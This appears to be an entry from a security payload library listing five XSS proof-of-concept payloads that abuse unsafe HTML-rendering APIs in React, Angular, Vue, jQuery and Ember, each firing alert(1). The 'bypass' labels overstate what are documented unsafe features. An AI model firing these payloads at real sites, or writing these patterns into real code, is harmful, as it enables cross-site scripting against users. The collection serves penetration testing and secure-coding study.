---
id: "xss-framework_bypass-payloads"
title: "XSS Payloads - Framework-Specific Bypasses"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "framework_bypass", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads designed to bypass popular JavaScript framework protections

## Payloads

### React dangerouslySetInnerHTML

Bypass React's XSS protection via dangerouslySetInnerHTML

- **Contexts**: script
- **Severity**: high

```html
React.createElement('div',{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}})
```

### Angular $sce.trustAsHtml

Bypass Angular's Strict Contextual Escaping

- **Contexts**: script
- **Severity**: high

```html
$sce.trustAsHtml('<script>alert(1)</script>')
```

### Vue v-html Directive

Abuse Vue.js v-html directive for XSS

- **Contexts**: html
- **Severity**: high

```html
<div v-html="'<img src=x onerror=alert(1)>'"></div>
```

### jQuery .html() Method

Bypass jQuery's basic escaping with .html()

- **Contexts**: script
- **Severity**: high

```html
$('<div>').html('<img src=x onerror=alert(1)>').appendTo('body')
```

### Ember.js SafeString

Abuse Ember.js SafeString for XSS execution

- **Contexts**: script
- **Severity**: medium

```html
Ember.String.htmlSafe('<script>alert(1)</script>')
```
